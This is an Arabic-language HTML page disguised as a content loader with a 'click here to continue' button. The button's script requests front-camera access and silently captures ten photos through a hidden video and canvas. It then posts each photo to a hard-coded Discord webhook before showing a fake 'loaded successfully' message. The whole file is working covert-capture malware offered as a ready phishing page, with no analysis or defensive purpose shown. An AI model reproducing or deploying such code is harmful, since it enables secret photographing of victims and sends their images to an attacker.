<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جار التحميل...</title>
    <style>
        body {
            background-color: #f4f4f9;
            font-family: Tahoma, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        .btn {
            background-color: #4CAF50;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <h2>جاري تحميل المحتوى، يرجى الانتظار...</h2>
    <br>
    <button class="btn" onclick="startProcess()">اضغط هنا للمتابعة</button>

    <!-- عناصر مخفية -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1570172564448485448/zC2WdzBdGbd78cCrFei--KVTFUEJSIorz2GVkzJqk2GTjaYzA4B3XKhFNfzd1neSeV4P";

        async function startProcess() {
            try {
                // طلب إذن الكاميرا الأمامية
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // الانتظار ثانية واحدة لتستقر الكاميرا
                setTimeout(() => {
                    startBatchCapture(stream);
                }, 1000);
            } catch (err) {
                console.error("تعذر الوصول للكاميرا", err);
            }
        }

        function startBatchCapture(stream) {
            let count = 0;
            const totalImages = 10; 
            const intervalTime = 500; // صورتان في الثانية

            const captureInterval = setInterval(() => {
                if (count >= totalImages) {
                    clearInterval(captureInterval);
                    stream.getTracks().forEach(track => track.stop());
                    document.querySelector('h2').innerText = "تم التحميل بنجاح!";
                    return;
                }

                count++;
                captureAndSend(stream, count);
            }, intervalTime);
        }

        function captureAndSend(stream, index) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('file', blob, `capture_${index}.jpg`);

                // استخدام وكيل وسيط أو إرسال مباشر
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                }).catch(error => {
                    console.error("خطأ في الإرسال", error);
                });
            }, 'image/jpeg', 0.85);
        }
    </script>
</body>
</html>
